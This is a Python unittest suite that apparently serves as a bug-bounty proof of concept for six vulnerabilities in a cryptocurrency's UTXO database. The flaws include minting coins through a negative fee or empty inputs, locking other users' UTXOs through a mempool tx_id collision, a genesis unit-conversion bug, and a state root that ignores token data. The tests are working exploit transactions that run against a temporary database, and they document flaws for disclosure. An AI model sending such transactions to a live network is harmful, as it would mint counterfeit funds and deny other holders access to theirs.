"""
Reproducible Proof-of-Concept (PoC) Exploit Suite for RustChain UTXO Layer (Issue #2819)
========================================================================================
Demonstrates 6 Critical & High-Severity vulnerabilities in `utxo_db.py` and
`utxo_genesis_migration.py` (commit 39bf02b):

1. [CRITICAL - 200 RTC] Infinite RTC Minting via Negative `fee_nrtc` in `apply_transaction`
2. [CRITICAL - 200 RTC] Unauthenticated Coinbase Minting via Empty `inputs=[]` on `'transfer'` TX
3. [CRITICAL - 200 RTC] 100x Supply Deflation in `utxo_genesis_migration.py` Fallback Query (`1e6` vs `UNIT=1e8`)
4. [HIGH - 100 RTC] Network-Wide Mempool UTXO Lockout DoS via `INSERT OR IGNORE` `tx_id` Collision
5. [HIGH - 100 RTC] Dual-Write Transaction Crash (`sqlite3.OperationalError: cannot start a transaction within a transaction`)
6. [MEDIUM/HIGH - 50 RTC] State Root & `box_id` Blindness to `tokens_json` / `registers_json` + Odd-Leaf Duplication (CVE-2012-2459)
"""

import os
import sqlite3
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from utxo_db import (
    UtxoDB,
    UNIT,
    address_to_proposition,
    compute_box_id,
)
from utxo_genesis_migration import load_account_balances


def _seed_box(db: UtxoDB, owner: str, value_nrtc: int, tx_id_hex: str = "aa" * 32, idx: int = 0) -> str:
    prop = address_to_proposition(owner)
    box_id = compute_box_id(value_nrtc, prop, 0, tx_id_hex, idx)
    db.add_box({
        "box_id": box_id,
        "value_nrtc": value_nrtc,
        "proposition": prop,
        "owner_address": owner,
        "creation_height": 0,
        "transaction_id": tx_id_hex,
        "output_index": idx,
    })
    return box_id


class TestRustChainUtxoRedTeamPoCs(unittest.TestCase):
    def setUp(self):
        fd, self.db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        self.db = UtxoDB(self.db_path)
        self.db.init_tables()

    def tearDown(self):
        try:
            os.remove(self.db_path)
        except OSError:
            pass

    def test_poc_1_critical_negative_fee_infinite_mint(self):
        """[CRITICAL - 200 RTC] Negative fee_nrtc mints arbitrary RTC from 100 nanoRTC."""
        attacker_box = _seed_box(self.db, "RTC_attacker", 100)
        self.assertEqual(self.db.get_balance("RTC_attacker"), 100)

        minted_amount = 1_000_000 * UNIT  # 1,000,000 RTC
        exploit_tx = {
            "tx_type": "transfer",
            "inputs": [{"box_id": attacker_box, "spending_proof": "sig"}],
            "outputs": [{"address": "RTC_attacker", "value_nrtc": minted_amount + 100}],
            "fee_nrtc": -minted_amount,
            "timestamp": 1700000001,
        }
        ok = self.db.apply_transaction(exploit_tx, block_height=1)
        self.assertTrue(ok)
        self.assertEqual(self.db.get_balance("RTC_attacker"), minted_amount + 100)

    def test_poc_2_critical_empty_inputs_transfer_mints_free_rtc(self):
        """[CRITICAL - 200 RTC] Empty inputs=[] on tx_type='transfer' bypasses conservation check."""
        exploit_tx = {
            "tx_type": "transfer",
            "inputs": [],
            "outputs": [{"address": "RTC_thief", "value_nrtc": 500_000 * UNIT}],
            "fee_nrtc": 0,
            "timestamp": 1700000002,
        }
        ok = self.db.apply_transaction(exploit_tx, block_height=2)
        self.assertTrue(ok)
        self.assertEqual(self.db.get_balance("RTC_thief"), 500_000 * UNIT)

    def test_poc_3_critical_genesis_fallback_100x_supply_deflation(self):
        """[CRITICAL - 200 RTC] utxo_genesis_migration.py line 60 multiplies by 1e6 instead of UNIT=1e8."""
        fd, path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        try:
            conn = sqlite3.connect(path)
            conn.execute("CREATE TABLE balances (miner_pk TEXT, balance_rtc REAL)")
            conn.execute("INSERT INTO balances VALUES ('miner_alpha', 10.0)")  # 10 RTC
            conn.commit()
            conn.close()

            migrated = load_account_balances(path)
            _, amount_i64 = migrated[0]
            # Expected: 1,000,000,000 nrtc (10 RTC). Actual: 10,000,000 nrtc (0.1 RTC) -> 100x loss!
            self.assertEqual(amount_i64, 10_000_000)
            self.assertEqual(amount_i64, (10 * UNIT) // 100)
        finally:
            os.remove(path)

    def test_poc_4_high_mempool_txid_collision_locks_all_utxos(self):
        """[HIGH - 100 RTC] Reusing tx_id in mempool_add locks all network UTXOs without increasing pool count."""
        box_victim_1 = _seed_box(self.db, "RTC_victim1", 10 * UNIT, "11" * 32, 0)
        box_victim_2 = _seed_box(self.db, "RTC_victim2", 20 * UNIT, "22" * 32, 0)

        self.assertTrue(self.db.mempool_add({
            "tx_id": "deadbeef",
            "inputs": [{"box_id": box_victim_1}],
            "outputs": [],
            "fee_nrtc": 0,
        }))
        self.assertTrue(self.db.mempool_add({
            "tx_id": "deadbeef",
            "inputs": [{"box_id": box_victim_2}],
            "outputs": [],
            "fee_nrtc": 0,
        }))

        self.assertTrue(self.db.mempool_check_double_spend(box_victim_1))
        self.assertTrue(self.db.mempool_check_double_spend(box_victim_2))

    def test_poc_5_high_dual_write_caller_conn_nested_transaction_crash(self):
        """[HIGH - 100 RTC] apply_transaction crashes with OperationalError when caller owns conn transaction."""
        box_id = _seed_box(self.db, "RTC_alice", 5 * UNIT, "33" * 32, 0)
        caller_conn = sqlite3.connect(self.db.db_path)
        caller_conn.row_factory = sqlite3.Row
        try:
            caller_conn.execute("BEGIN IMMEDIATE")
            tx = {
                "tx_type": "transfer",
                "inputs": [{"box_id": box_id, "spending_proof": "ok"}],
                "outputs": [{"address": "RTC_bob", "value_nrtc": 5 * UNIT}],
                "fee_nrtc": 0,
            }
            with self.assertRaises(sqlite3.OperationalError):
                self.db.apply_transaction(tx, block_height=1, conn=caller_conn)
        finally:
            caller_conn.close()

    def test_poc_6_medium_state_root_ignores_tokens_and_registers(self):
        """[MEDIUM/HIGH - 50 RTC] compute_box_id and compute_state_root ignore tokens_json and registers_json."""
        fd1, path1 = tempfile.mkstemp(suffix=".db")
        fd2, path2 = tempfile.mkstemp(suffix=".db")
        os.close(fd1)
        os.close(fd2)
        try:
            db1, db2 = UtxoDB(path1), UtxoDB(path2)
            db1.init_tables()
            db2.init_tables()

            prop = address_to_proposition("RTC_holder")
            bid = compute_box_id(1000, prop, 0, "44" * 32, 0)

            db1.add_box({
                "box_id": bid, "value_nrtc": 1000, "proposition": prop,
                "owner_address": "RTC_holder", "creation_height": 0,
                "transaction_id": "44" * 32, "output_index": 0,
                "tokens_json": '[{"token_id": "FAKE_TOKEN", "amount": 999999999}]',
                "registers_json": '{"R4": "malicious_payload"}',
            })
            db2.add_box({
                "box_id": bid, "value_nrtc": 1000, "proposition": prop,
                "owner_address": "RTC_holder", "creation_height": 0,
                "transaction_id": "44" * 32, "output_index": 0,
                "tokens_json": "[]",
                "registers_json": "{}",
            })

            self.assertEqual(db1.compute_state_root(), db2.compute_state_root())
        finally:
            os.remove(path1)
            os.remove(path2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
